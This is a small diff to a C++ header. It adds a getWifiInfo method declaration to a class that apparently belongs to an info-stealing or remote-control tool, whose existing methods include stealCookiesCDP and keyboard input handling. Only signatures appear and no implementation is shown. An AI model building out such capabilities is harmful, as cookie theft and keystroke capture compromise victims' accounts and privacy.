@@ -37,4 +37,6 @@ public:
     static json stealCookiesCDP(const json &);
 
     static json handleKeyboardInput(const json &);
+
+    static json getWifiInfo(const json &);
 };
